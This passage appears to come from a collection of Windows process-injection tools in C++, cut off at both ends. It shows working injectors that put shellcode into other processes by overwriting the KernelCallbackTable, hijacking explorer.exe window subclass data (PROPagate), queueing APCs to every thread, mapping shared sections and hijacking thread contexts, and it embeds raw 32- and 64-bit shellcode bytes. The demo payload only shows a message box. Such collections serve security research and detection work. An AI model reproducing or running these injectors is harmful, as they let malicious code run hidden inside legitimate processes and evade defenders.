	// the first entry in the callback table is the copy data callback. Overwrite it with a pointer to our shellcode.
	DWORD oldProtection;
	if (!VirtualProtectEx(processHandle, peb.KernelCallbackTable, sizeof(remoteShellcodeMemory), PAGE_EXECUTE_READWRITE, &oldProtection))
	{
		printf("[Error] %d - Failed to modify page protection of kernel callback table\n", GetLastError());
		return 1;
	}
	if (!WriteProcessMemory(processHandle, peb.KernelCallbackTable, &remoteShellcodeMemory, sizeof(void*), nullptr))
	{
		printf("[Error] %d - Failed to modify kernel callback table entry in target process\n", GetLastError());
		return 1;
	}
	if (!VirtualProtectEx(processHandle, peb.KernelCallbackTable, sizeof(remoteShellcodeMemory), oldProtection, &oldProtection))
	{
		printf("[Error] %d - Failed to restore page protection of kernel callback table\n", GetLastError());
		return 1;
	}

	printf("[Info] - Modified COPYDATA callback in kernel callback table\n");
	printf("[Info] - Executing shellcode by sending a WM_COPYDATA message to the window\n");

	// execute payload by sending a WM_COPYDATA window message and therefore executing the copy data callback
	COPYDATASTRUCT copyData = COPYDATASTRUCT();
	SendMessageA(windowHandle, WM_COPYDATA, (WPARAM)windowHandle, (LPARAM)&copyData);

	// cleanup
	VirtualFreeEx(processHandle, remoteShellcodeMemory, 0, MEM_RELEASE);
	CloseHandle(processHandle);

	return 0;
}
```

`shellcode_injection/propagate_injection.cpp`:

```cpp
/**
* Injects shellcode into explorer.exe abusing a subclassed window.
* Supports 32- and 64 Bit applications.
* [Warning] - The current implementation causes the process crash after executing the shellcode because it does not match the SUBCLASSPROC signature
* [Requirements]
*	- target process must have a subclassed window
* Based on: https://modexp.wordpress.com/2018/08/23/process-injection-propagate/
*/


#include <windows.h>
#include <stdio.h>

#include "../payload/shellcode.hpp"

typedef LRESULT(CALLBACK* SUBCLASSPROC)(
	HWND      hWnd,
	UINT      uMsg,
	WPARAM    wParam,
	LPARAM    lParam,
	UINT_PTR  uIdSubclass,
	DWORD_PTR dwRefData
);

typedef struct _SUBCLASS_CALL {
	SUBCLASSPROC pfnSubclass;    // subclass procedure
	WPARAM       uIdSubclass;    // unique subclass identifier
	DWORD_PTR    dwRefData;      // optional ref data
} SUBCLASS_CALL, PSUBCLASS_CALL;

typedef struct _SUBCLASS_FRAME {
	UINT                    uCallIndex;   // index of next callback to call
	UINT                    uDeepestCall; // deepest uCallIndex on stack
	struct _SUBCLASS_FRAME* pFramePrev;  // previous subclass frame pointer
	struct _SUBCLASS_HEADER* pHeader;     // header associated with this frame
} SUBCLASS_FRAME, PSUBCLASS_FRAME;

typedef struct _SUBCLASS_HEADER {
	UINT           uRefs;        // subclass count
	UINT           uAlloc;       // allocated subclass call nodes
	UINT           uCleanup;     // index of call node to clean up
	DWORD          dwThreadId;   // thread id of window we are hooking
	SUBCLASS_FRAME* pFrameCur;   // current subclass frame pointer
	SUBCLASS_CALL  CallArray[1]; // base of packed call node array
} SUBCLASS_HEADER, * PSUBCLASS_HEADER;


HWND shellDllDefViewWindowHandle = nullptr;


// credits: https://stackoverflow.com/questions/36566675/winapi-how-to-obtain-shelldll-defview
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) 
{
	HWND currentWindowHandle = FindWindowExA(hwnd, 0, "SHELLDLL_DefView", 0);
	if (currentWindowHandle) 
	{
		// keep enumerating if the current window handle has more than 1 child
		if (GetNextWindow(currentWindowHandle, GW_HWNDNEXT) || GetNextWindow(currentWindowHandle, GW_HWNDPREV))
		{
			return true;
		}
		
		shellDllDefViewWindowHandle = currentWindowHandle;
		return false;
	}
	return true;
}

bool Propagate(LPVOID payload, DWORD payloadSize)
{
	EnumWindows(&EnumWindowsProc, 0);

	if (!shellDllDefViewWindowHandle)
	{
		printf("[Error] - Failed to find ShellDll_DefView window handle\n");
		return false;
	}

	printf("[Info] - Found ShellDll_DefView window handle\n");

	HANDLE propHandle = GetPropA(shellDllDefViewWindowHandle, "UxSubclassInfo");
	if (!propHandle)
	{
		printf("[Error] - Failed to get a handle to UxSubclassInfo using GetPropA\n");
		return false;
	}

	printf("[Info] - Found UxSubclassInfo\n");

	DWORD processId;
	if (!GetWindowThreadProcessId(shellDllDefViewWindowHandle, &processId))
	{
		printf("[Error] - Failed GetWindowThreadProcessId\n");
		return false;
	}

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	if (!processHandle)
	{
		printf("[Error] %d - Failed to OpenProcess explorer.exe\n", GetLastError());
		return false;
	}

	printf("[Info] - Acquired handle to explorer.exe\n");

	SUBCLASS_HEADER subclassHeader;
	SIZE_T numberOfBytesRead;
	if (!ReadProcessMemory(processHandle, (LPVOID)propHandle, &subclassHeader, sizeof(subclassHeader), &numberOfBytesRead))
	{
		printf("[Error] %d - Failed to read subclass header (ReadProcessMemory)\n", GetLastError());
		return false;
	}

	LPVOID remoteSubclassHeaderBuffer = VirtualAllocEx(processHandle, NULL, sizeof(subclassHeader), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!remoteSubclassHeaderBuffer)
	{
		printf("[Error] %d - Failed to allocate remote memory for subclass header (VirtualAllocEx)\n", GetLastError());
		return false;
	}

	LPVOID remoteSubclassBuffer = VirtualAllocEx(processHandle, NULL, payloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteSubclassBuffer)
	{
		printf("[Error] %d - Failed to allocate remote memory for subclass (VirtualAllocEx)\n", GetLastError());
		return false;
	}

	SIZE_T numberOfbytesWritten;
	if (!WriteProcessMemory(processHandle, remoteSubclassBuffer, payload, payloadSize, &numberOfbytesWritten))
	{
		printf("[Error] %d - Failed to write payload into remote subclass (WriteProcessMemory)\n", GetLastError());
		return false;
	}

	// set subclass procedure to payload
	subclassHeader.CallArray[0].pfnSubclass = (SUBCLASSPROC)remoteSubclassBuffer;

	if(!WriteProcessMemory(processHandle, remoteSubclassHeaderBuffer, &subclassHeader, sizeof(subclassHeader), &numberOfbytesWritten))
	{
		printf("[Error] %d - Failed to write updated subclass header into remote process (WriteProcessMemory)\n", GetLastError());
		return false;
	}

	printf("[Info] - Wrote payload and payload header into subclass\n");

	if (!SetPropA(shellDllDefViewWindowHandle, "UxSubclassInfo", remoteSubclassHeaderBuffer))
	{
		printf("[Error] %d - Failed to change UxSubclassInfo to the new subclass header using SetProp\n", GetLastError());
		return false;
	}

	printf("[Info] - Updated UxSubclassInfo to new subclass header\n");

	SendMessageA(shellDllDefViewWindowHandle, WM_CLOSE, 0, 0);

	printf("[Info] - Executed payload by send a WM_CLOSE message to the window\n");

	if (!SetPropA(shellDllDefViewWindowHandle, "UxSubclassInfo", propHandle))
	{
		printf("[Error] %d - Failed to restore subclass header using SetPropA\n", GetLastError());
		return false;
	}

	printf("[Info] - Restored original subclass header\n");

	// cleanup
	VirtualFreeEx(processHandle, remoteSubclassHeaderBuffer, 0, MEM_RELEASE);
	VirtualFreeEx(processHandle, remoteSubclassBuffer, 0, MEM_RELEASE);
	CloseHandle(processHandle);

	return true;
}

int main(int argc, char* argv[])
{
	if (!Propagate(shellcode, sizeof(shellcode)))
	{
		printf("[Error] - Failed to propagate\n");
		return 1;
	}

	return 0;
}
```

`shellcode_injection/queueapc_injection.cpp`:

```cpp
/**
* Injects shellcode into every thread of a process using QueueAPC.
* [Warning] - The current implementation causes the process crash after executing the shellcode since the shellcode does not comply the PAPCFUNC prototype expected by QueueUserApc.
* [Requirements]
*	- atleast one thread must be in alertable state at some point
*/

#include <Windows.h>
#include <cstdio>
#include <tlhelp32.h>
#include <vector>

#include "../payload/shellcode.hpp"

int main(int argc, char* argv[])
{
	const char* processName;

	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}

	processName = argv[1];

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("[Error] %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;
	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("[Error] - Failed to find process: %s\n", processName);
		return 1;
	}

	printf("[Info] - Found Process %s with id %d\n", processName, processEntry.th32ProcessID);

	// acquire a handle to the target process
	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	// allocate memory in target process
	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, sizeof(shellcode)-1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Allocated remote memory at %p\n", remoteMemory);

	// write shellcode into target process
	if (!WriteProcessMemory(targetProcessHandle, remoteMemory, shellcode, sizeof(shellcode)-1, NULL))
	{
		printf("[Error] %d - Failed to write .dll path to target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Wrote shellcode to remote memory at %p\n", remoteMemory);

	// get first thread of snapshot
	THREADENTRY32 currentThreadEntry = { sizeof(THREADENTRY32) };
	if (!Thread32First(processesSnapshot, &currentThreadEntry))
	{
		printf("[Error] %d - Failed to Thread32First\n", GetLastError());
		return 1;
	}

	// iterate over target processes threads and inject APC into each of them
	// this increases the chance of the shellcode being executed since only one of the thread needs to reach an alertable state
	do
	{
		if (currentThreadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
		{
			HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, currentThreadEntry.th32ThreadID);
			if (!threadHandle)
			{
				printf("[Warning] - Failed to acquire thread handle with error %d\n", GetLastError());
				continue;
			}
			QueueUserAPC((PAPCFUNC)remoteMemory, threadHandle, NULL);
			printf("[Info] - Queued APC for thread %d\n", currentThreadEntry.th32ThreadID);
			CloseHandle(threadHandle);
		}
	} while (Thread32Next(processesSnapshot, &currentThreadEntry));

	return 0;
}
```

`shellcode_injection/section_injection.cpp`:

```cpp
/**
* Injects shellcode into a process using a shared section.
* Supports 32- and 64 Bit applications.
* [Warning] - The current implementation crashes the target process after executing the shellcode
*/

#include <Windows.h>
#include <string>
#include <cstdio>
#include <tlhelp32.h>

#include "../payload/shellcode.hpp"
#include "../common/ntddk.h"


int main(int argc, char* argv[])
{
	const char* processName;

	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}

	processName = argv[1];

	printf("[Info] - Injecting shellcode into %s\n", processName);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("[Error] %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;

	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("[Error] - Failed to find process: %s\n", processName);
		return 1;
	}

	printf("[Info] - Found Process %s with pid %d\n", processName, processEntry.th32ProcessID);

	// acquire a handle to the target process
	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	printf("[Info] - Acquired process handle %p\n", targetProcessHandle);

	HANDLE section;
	SIZE_T size = 0x1000;
	LARGE_INTEGER sectionSize = { size };
	void* localSectionOffset = nullptr;
	void* remoteSectionOffset = nullptr;

	// create the section to be shared between this and the target process
	if (!NT_SUCCESS(NtCreateSection(&section, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)))
	{
		printf("[Error] - Failed to create section\n");
		return 1;
	}

	// map into own process
	if (!NT_SUCCESS(NtMapViewOfSection(section, GetCurrentProcess(), &localSectionOffset, NULL, NULL, NULL, &size, ViewUnmap, NULL, PAGE_READWRITE)))
	{
		printf("[Error] - Failed to map view of section into own section\n");
		return 1;
	}

	// map into target process
	if (!NT_SUCCESS(NtMapViewOfSection(section, targetProcessHandle, &remoteSectionOffset, NULL, NULL, NULL, &size, ViewUnmap, NULL, PAGE_EXECUTE_READ)))
	{
		printf("[Error] - Failed to mao view of section into target process\n");
		return 1;
	}

	// copy shellcode into section. This change will be reflected in the target process
	memcpy(localSectionOffset, shellcode, sizeof(shellcode));

	// create a thread in the target process which loads the .dll
	HANDLE hThread = CreateRemoteThread(
		targetProcessHandle,
		nullptr,
		NULL,
		reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteSectionOffset),
		NULL,
		NULL,
		nullptr
	);

	if (!hThread)
	{
		printf("[Error %d] - Failed to CreateRemoteThread\n", GetLastError());
		return 1;
	}

	printf("[Info] - Created remote thread. Executing %p\n", remoteSectionOffset);

	CloseHandle(hThread);
}
```

`shellcode_injection/threadcontext_injection.cpp`:

```cpp
/**
* Injects shellcode into every thread of a process using Get/SetThreadContext.
* Supports 32- and 64 Bit applications.
*/

#include <Windows.h>
#include <cstdio>
#include <tlhelp32.h>
#include <vector>

#include "../payload/shellcode.hpp"

// https://www.exploit-db.com/exploits/37758
// // https://github.com/NoviceLive/shellcoding/blob/master/windows/messagebox/messagebox32.asm
// this is 32 bit shellcode
/*char reigsterpreserving_shellcode[] = "\x60\x9c\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
"\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
"\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
"\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
"\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
"\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
"\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
"\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
"\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
"\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
"\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
"\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
"\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
"\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
"\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"
"\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"
"\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
"\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
"\x69\x74\x54\x53\xff\xd6\x57\xff\xd0\x9d\x61\xE9\x00\x00\x00\x00";*/


#ifdef _WIN64
#define Xip Rip
// modified based on: https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12
// removed ExitProcesss
// added jmp to cleanup
char reigsterpreserving_shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

BYTE pushRegisters[] = {
		0x9C,														//pushfq	
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x3C, 0x24,							//movdqu XMMWORD PTR [rsp],xmm15
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x34, 0x24,							//movdqu XMMWORD PTR [rsp],xmm14
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x2C, 0x24,							//movdqu XMMWORD PTR [rsp],xmm13
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x24, 0x24,							//movdqu XMMWORD PTR [rsp],xmm12
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x1C, 0x24,							//movdqu XMMWORD PTR [rsp],xmm11
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x14, 0x24,							//movdqu XMMWORD PTR [rsp],xmm10
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x0C, 0x24,							//movdqu XMMWORD PTR [rsp],xmm9
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x04, 0x24,							//movdqu XMMWORD PTR [rsp],xmm8
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x3C, 0x24,								//movdqu XMMWORD PTR [rsp],xmm7
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x34, 0x24,								//movdqu XMMWORD PTR [rsp],xmm6
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x2C, 0x24,								//movdqu XMMWORD PTR [rsp],xmm5
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x24, 0x24,								//movdqu XMMWORD PTR [rsp],xmm4
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x1C, 0x24,								//movdqu XMMWORD PTR [rsp],xmm3
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x14, 0x24,								//movdqu XMMWORD PTR [rsp],xmm2
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x0C, 0x24,								//movdqu XMMWORD PTR [rsp],xmm1
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x04, 0x24,								//movdqu XMMWORD PTR [rsp],xmm0
		0x41, 0x57,													//push   r15
		0x41, 0x56,													//push   r14
		0x41, 0x55,													//push   r13
		0x41, 0x54,													//push   r12
		0x41, 0x53,													//push   r11
		0x41, 0x52,													//push   r10
		0x41, 0x51,													//push   r9
		0x41, 0x50,													//push   r8
		0x57,														//push   rdi
		0x56,														//push   rsi
		0x55,														//push   rbp
		0x53,														//push   rbx
		0x52,														//push   rdx
		0x51,														//push   rcx
		0x50,														//push   rax
};

BYTE correctStackAndPopRegisters[] = {
	0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00,				//add    rsp,0x1a8
0x58,														//pop    rax
0x59,														//pop    rcx
0x5A,														//pop    rdx
0x5B,														//pop    rbx
0x5D,														//pop    rbp
0x5E,														//pop    rsi
0x5F,														//pop    rdi
0x41, 0x58,													//pop    r8
0x41, 0x59,													//pop    r9
0x41, 0x5A,													//pop    r10
0x41, 0x5B,													//pop    r11
0x41, 0x5C,													//pop    r12
0x41, 0x5D,													//pop    r13
0x41, 0x5E,													//pop    r14
0x41, 0x5F,													//pop    r15
0xF3, 0x0F, 0x6F, 0x04, 0x24,								//movdqu xmm0,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x0C, 0x24,								//movdqu xmm1,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x14, 0x24,								//movdqu xmm2,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x1C, 0x24,								//movdqu xmm3,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x24, 0x24,								//movdqu xmm4,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x2C, 0x24,								//movdqu xmm5,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x34, 0x24,								//movdqu xmm6,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x3C, 0x24,								//movdqu xmm7,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x04, 0x24,							//movdqu xmm8,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x0C, 0x24,							//movdqu xmm9,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x14, 0x24,							//movdqu xmm10,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x1C, 0x24,							//movdqu xmm11,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x24, 0x24,							//movdqu xmm12,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x2C, 0x24,							//movdqu xmm13,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x34, 0x24,							//movdqu xmm14,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x3C, 0x24,							//movdqu xmm15,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x20
0x9D														//popfq
};
#else
#define Xip Eip
/**
*	removed Exit process
*	start with saving registers (pushfd, pushad)
*	Correct stack for pushes of shellcode strings: added "add esp,0x4c"
*	restore saved registers (popfd, popad)
*	added jmp back at the end (jmp rel32)
*/
char reigsterpreserving_shellcode[] = "\x60\x9c\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
"\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
"\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
"\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
"\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
"\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
"\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
"\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
"\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
"\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
"\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
"\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
"\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
"\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
"\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"
"\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"
"\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
"\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
"\x69\x74\x54\x53\xff\xd6\x83\xC4\x4C\x9d\x61\xE9\x00\x00\x00\x00"; // removed exit process, added "add esp,0x4c" (\x83\xC4\x4C), added jmp back
#endif

int main(int argc, char* argv[])
{
	const char* processName;

	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}
	
	processName = argv[1];

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("[Error] %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;
	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("[Error] - Failed to find process: %s\n", processName);
		return 1;
	}

	printf("[Info] - Found Process %s with id %d\n", processName, processEntry.th32ProcessID);

	// acquire a handle to the target process
	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	// allocate memory in target process
	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, sizeof(reigsterpreserving_shellcode) - 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Allocated remote memory at %p\n", remoteMemory);

	// get first thread of snapshot
	THREADENTRY32 currentThreadEntry = { sizeof(THREADENTRY32) };
	if (!Thread32First(processesSnapshot, &currentThreadEntry))
	{
		printf("[Error] %d - Failed to Thread32First\n", GetLastError());
		return 1;
	}

	// find to thread in the target processes and execute code by changing its CONTEXT
	do
	{
		if (currentThreadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
		{
